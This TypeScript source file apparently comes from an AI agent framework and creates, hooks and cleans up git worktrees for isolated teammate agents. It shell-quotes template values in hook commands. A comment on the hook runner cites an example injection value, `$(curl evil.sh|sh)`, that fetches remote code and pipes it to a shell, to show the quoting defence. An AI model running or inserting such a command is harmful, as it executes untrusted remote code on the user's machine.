/**
 * Git-worktree allocator for teammate isolation. Mirrors a subset of
 * worktrunk's config schema (https://worktrunk.dev/config/) under the
 * `worktree` namespace in `noetic.config.ts`. No `wt` binary dependency —
 * we shell out to `git worktree` directly via the injected `ShellAdapter`.
 *
 * Returns the new `worktreePath` to the caller (the `agent` tool) which is
 * then responsible for re-rooting the child's tool pool at that path via
 * `buildParentTools(worktreePath)` — this adapter does not touch tools.
 */

import * as path from 'node:path';
import type { ShellAdapter, ShellExecResult } from '@noetic/core';
import {
  worktreeAddFailed,
  worktreeHookFailed,
  worktreeNoDefaultBranch,
  worktreeNotGitRepo,
  worktreeRemoveFailed,
} from '../errors/worktree-errors.js';
import { shellQuote } from '../tools/path-utils.js';
import type { WorktreeConfig, WorktreeHook } from '../types/config.js';
import { warn as logWarn } from '../util/log.js';

//#region Types

interface CreateAgentWorktreeArgs {
  agentId: string;
  cwd: string;
  shell: ShellAdapter;
  config: WorktreeConfig | undefined;
  /**
   * Cleanup mode used when `config?.cleanup` is unset. The agent tool passes
   * `'never'` for sync teammates (so the user can inspect what ran) and
   * `'if-clean'` for async/named (so the registry doesn't accumulate worktrees
   * over a long session).
   */
  defaultCleanup?: NonNullable<WorktreeConfig['cleanup']>;
}

interface AgentWorktree {
  /** Absolute path to the new worktree's working tree. */
  worktreePath: string;
  /** Branch name (newly created on top of the repo's default branch). */
  branch: string;
  /** Idempotent cleanup — call once when the teammate has settled. */
  cleanup(): Promise<WorktreeCleanupResult>;
}

interface WorktreeCleanupResult {
  /** Whether the worktree was removed. */
  removed: boolean;
  /** Path retained on disk (set when `removed` is false). */
  retainedAt?: string;
}

//#endregion

//#region Constants

const DEFAULT_WORKTREE_PATH_TEMPLATE = '{{ repo_path }}/../{{ repo }}.{{ agent_id | sanitize }}';
const DEFAULT_BRANCH_TEMPLATE = 'noetic/teammate/{{ agent_id }}';
const DEFAULT_CLEANUP_MODE: NonNullable<WorktreeConfig['cleanup']> = 'if-clean';
const HOOK_TIMEOUT_S = 300;
const PORT_HASH_FLOOR = 10000;
const PORT_HASH_RANGE = 10000;

//#endregion

//#region Template Renderer

/**
 * Replace `/` and `\` with `-`, lowercase, then strip remaining non-word chars.
 * Matches worktrunk's `sanitize` filter intent: produce a filesystem-safe slug.
 */
function sanitizeFilter(input: string): string {
  return input
    .replace(/[/\\]/g, '-')
    .toLowerCase()
    .replace(/[^a-z0-9._-]/g, '-');
}

/**
 * Deterministic hash to a port in [10000, 19999]. Matches worktrunk's
 * `hash_port` filter so the same branch name maps to the same port whether
 * a developer is using `wt` directly or a noetic teammate.
 */
function hashPortFilter(input: string): string {
  let h = 5381;
  for (let i = 0; i < input.length; i++) {
    h = ((h << 5) + h + input.charCodeAt(i)) | 0;
  }
  const port = PORT_HASH_FLOOR + (Math.abs(h) % PORT_HASH_RANGE);
  return String(port);
}

const FILTERS: Record<string, (input: string) => string> = {
  sanitize: sanitizeFilter,
  hash_port: hashPortFilter,
};

const TEMPLATE_PATTERN = /\{\{\s*([a-z_][a-z0-9_]*)(?:\s*\|\s*([a-z_][a-z0-9_]*))?\s*\}\}/gi;

interface RenderTemplateOptions {
  /**
   * When true, every variable substitution is wrapped via `shellQuote` so the
   * rendered string is safe to pass to a shell. Used for hook commands; not
   * used for path templates (which are already shell-quoted at the call site).
   */
  autoQuote?: boolean;
}

/**
 * Tiny `{{ var }}` / `{{ var | filter }}` renderer. Mirrors the subset of
 * worktrunk's templating used by `worktree-path`, `branch`, and hook commands.
 * Unknown variables expand to empty string; unknown filters are passed through
 * (raw value) to avoid silent corruption of paths.
 */
export function renderTemplate(
  template: string,
  vars: Record<string, string>,
  options: RenderTemplateOptions = {},
): string {
  return template.replace(TEMPLATE_PATTERN, (_, name: string, filter?: string) => {
    const raw = vars[name] ?? '';
    const filtered = filter === undefined ? raw : (FILTERS[filter]?.(raw) ?? raw);
    return options.autoQuote ? shellQuote(filtered) : filtered;
  });
}

//#endregion

//#region Hook Runner

interface HookEntry {
  label: string;
  command: string;
}

function normalizeHook(hook: WorktreeHook | undefined): HookEntry[] {
  if (hook === undefined) {
    return [];
  }
  if (typeof hook === 'string') {
    return [
      {
        label: 'hook',
        command: hook,
      },
    ];
  }
  return Object.entries(hook).map(([label, command]) => ({
    label,
    command,
  }));
}

interface RunHooksArgs {
  entries: HookEntry[];
  cwd: string;
  shell: ShellAdapter;
  vars: Record<string, string>;
}

interface RunHookArgs {
  entry: HookEntry;
  cwd: string;
  shell: ShellAdapter;
  vars: Record<string, string>;
}

/**
 * Render hook commands with template substitutions auto-quoted to prevent
 * shell injection — a teammate `name` like `$(curl evil.sh|sh)` becomes a
 * literal argument, not a substitution.
 */
async function runHook(args: RunHookArgs): Promise<ShellExecResult> {
  const command = renderTemplate(args.entry.command, args.vars, {
    autoQuote: true,
  });
  return args.shell.exec(command, {
    cwd: args.cwd,
    timeout: HOOK_TIMEOUT_S,
  });
}

async function runHooksSequential(args: RunHooksArgs): Promise<void> {
  for (const entry of args.entries) {
    const result = await runHook({
      entry,
      cwd: args.cwd,
      shell: args.shell,
      vars: args.vars,
    });
    if (result.exitCode !== 0) {
      const stderr = result.stderr.trim();
      const stdout = result.stdout.trim();
      const detail = stderr || stdout || `exit ${result.exitCode}`;
      throw worktreeHookFailed({
        hook: entry.label,
        detail,
      });
    }
  }
}

function runHooksBackground(args: RunHooksArgs): void {
  for (const entry of args.entries) {
    void runHook({
      entry,
      cwd: args.cwd,
      shell: args.shell,
      vars: args.vars,
    }).catch((err: unknown) => {
      // Background hooks are advisory — don't propagate, but warn so the
      // operator can debug a silently-broken `post-start` (e.g. dev server).
      const msg = err instanceof Error ? err.message : 'unknown error';
      logWarn(`[worktree] background hook '${entry.label}' failed: ${msg}`);
    });
  }
}

//#endregion

//#region Git helpers

async function gitDefaultBranch(cwd: string, shell: ShellAdapter): Promise<string> {
  // Try in order of reliability:
  //   1. origin/HEAD symbolic-ref (the actual remote default; most reliable)
  //   2. local init.defaultBranch git config (set by `git init -b ...`)
  //   3. `main` then `master` if either exists locally
  // We deliberately avoid `rev-parse HEAD`, which returns whatever branch the
  // parent worktree happens to be on — that can be a feature branch and would
  // both poison the cleanup-clean check and corrupt the spawn base.
  const symbolic = await shell.exec('git symbolic-ref refs/remotes/origin/HEAD --short', {
    cwd,
    timeout: 5,
  });
  if (symbolic.exitCode === 0) {
    const out = symbolic.stdout.trim();
    if (out.length > 0 && out !== 'HEAD') {
      return out.replace(/^origin\//, '');
    }
  }

  const configured = await shell.exec('git config --get init.defaultBranch', {
    cwd,
    timeout: 5,
  });
  if (configured.exitCode === 0) {
    const out = configured.stdout.trim();
    if (out.length > 0) {
      return out;
    }
  }

  for (const candidate of [
    'main',
    'master',
  ]) {
    const exists = await shell.exec(
      `git show-ref --verify --quiet refs/heads/${shellQuote(candidate)}`,
      {
        cwd,
        timeout: 5,
      },
    );
    if (exists.exitCode === 0) {
      return candidate;
    }
  }

  throw worktreeNoDefaultBranch();
}

async function gitRepoPath(cwd: string, shell: ShellAdapter): Promise<string> {
  const res = await shell.exec('git rev-parse --show-toplevel', {
    cwd,
    timeout: 5,
  });
  if (res.exitCode !== 0) {
    throw worktreeNotGitRepo(cwd);
  }
  return res.stdout.trim();
}

async function gitWorktreeAdd(args: {
  worktreePath: string;
  branch: string;
  base: string;
  cwd: string;
  shell: ShellAdapter;
}): Promise<void> {
  const cmd = `git worktree add -b ${shellQuote(args.branch)} ${shellQuote(args.worktreePath)} ${shellQuote(args.base)}`;
  const res = await args.shell.exec(cmd, {
    cwd: args.cwd,
    timeout: 30,
  });
  if (res.exitCode !== 0) {
    throw worktreeAddFailed(res.stderr.trim() || res.stdout.trim());
  }
}

async function gitWorktreeRemove(
  worktreePath: string,
  cwd: string,
  shell: ShellAdapter,
): Promise<void> {
  const res = await shell.exec(`git worktree remove ${shellQuote(worktreePath)}`, {
    cwd,
    timeout: 30,
  });
  if (res.exitCode !== 0) {
    throw worktreeRemoveFailed(res.stderr.trim() || res.stdout.trim());
  }
}

interface IsWorktreeCleanArgs {
  worktreePath: string;
  baseBranch: string;
  shell: ShellAdapter;
}

/**
 * A worktree is "clean" iff (a) the working tree has no uncommitted changes
 * AND (b) the branch has no commits beyond the base. Counting against the
 * base (not `@{u}`) avoids the data-loss case where a fresh teammate branch
 * has no upstream and silently looks clean despite local commits.
 */
async function isWorktreeClean(args: IsWorktreeCleanArgs): Promise<boolean> {
  const status = await args.shell.exec('git status --porcelain', {
    cwd: args.worktreePath,
    timeout: 10,
  });
  if (status.exitCode !== 0) {
    return false;
  }
  if (status.stdout.trim().length > 0) {
    return false;
  }
  const log = await args.shell.exec(`git rev-list --count HEAD ^${shellQuote(args.baseBranch)}`, {
    cwd: args.worktreePath,
    timeout: 10,
  });
  if (log.exitCode !== 0) {
    // If we can't count, refuse to delete — better to leave a stale worktree
    // than to discard work. Warn so the operator notices accumulating dirs.
    logWarn(
      `[worktree] Could not count commits at ${args.worktreePath} against ${args.baseBranch}; ` +
        `keeping worktree to avoid potential data loss. Stderr: ${log.stderr.trim()}`,
    );
    return false;
  }
  return log.stdout.trim() === '0';
}

//#endregion

//#region Public API

/**
 * Allocate a new git worktree for a teammate, run `pre-start` hooks, kick
 * off `post-start` hooks in the background, and return a handle whose
 * `cleanup()` method tears down per the configured cleanup mode.
 */
export async function createAgentWorktree(args: CreateAgentWorktreeArgs): Promise<AgentWorktree> {
  const { agentId, cwd, shell, config } = args;
  const repoPath = await gitRepoPath(cwd, shell);
  const repoName = path.basename(repoPath);
  const defaultBranch = await gitDefaultBranch(repoPath, shell);

  const branchTemplate = config?.branch ?? DEFAULT_BRANCH_TEMPLATE;
  const pathTemplate = config?.['worktree-path'] ?? DEFAULT_WORKTREE_PATH_TEMPLATE;

  // Render branch first so it's available as a variable for the path template.
  const baseVars: Record<string, string> = {
    repo: repoName,
    repo_path: repoPath,
    branch: '',
    worktree_path: '',
    worktree_name: '',
    default_branch: defaultBranch,
    agent_id: agentId,
  };
  const branch = renderTemplate(branchTemplate, baseVars);

  const pathVars: Record<string, string> = {
    ...baseVars,
    branch,
  };
  const renderedPath = renderTemplate(pathTemplate, pathVars);
  const worktreePath = path.resolve(repoPath, renderedPath);
  const worktreeName = path.basename(worktreePath);

  const fullVars: Record<string, string> = {
    ...pathVars,
    worktree_path: worktreePath,
    worktree_name: worktreeName,
  };

  await gitWorktreeAdd({
    worktreePath,
    branch,
    base: defaultBranch,
    cwd: repoPath,
    shell,
  });

  // Once the worktree exists on disk, any failure between here and the return
  // must tear it down — otherwise we leak a worktree + branch with no caller
  // reference to the cleanup closure.
  try {
    await runHooksSequential({
      entries: normalizeHook(config?.['pre-start']),
      cwd: worktreePath,
      shell,
      vars: fullVars,
    });
  } catch (e) {
    await gitWorktreeRemove(worktreePath, repoPath, shell).catch(() => undefined);
    throw e;
  }

  runHooksBackground({
    entries: normalizeHook(config?.['post-start']),
    cwd: worktreePath,
    shell,
    vars: fullVars,
  });

  const cleanupMode = config?.cleanup ?? args.defaultCleanup ?? DEFAULT_CLEANUP_MODE;
  let cleanedUp = false;

  return {
    worktreePath,
    branch,
    async cleanup(): Promise<WorktreeCleanupResult> {
      if (cleanedUp) {
        return {
          removed: false,
          retainedAt: worktreePath,
        };
      }
      cleanedUp = true;

      if (cleanupMode === 'never') {
        return {
          removed: false,
          retainedAt: worktreePath,
        };
      }

      const shouldRemove =
        cleanupMode === 'always' ||
        (await isWorktreeClean({
          worktreePath,
          baseBranch: defaultBranch,
          shell,
        }));

      if (!shouldRemove) {
        return {
          removed: false,
          retainedAt: worktreePath,
        };
      }

      await runHooksSequential({
        entries: normalizeHook(config?.['pre-remove']),
        cwd: worktreePath,
        shell,
        vars: fullVars,
      });
      await gitWorktreeRemove(worktreePath, repoPath, shell);
      return {
        removed: true,
      };
    },
  };
}

//#endregion

export type { AgentWorktree, CreateAgentWorktreeArgs, WorktreeCleanupResult };
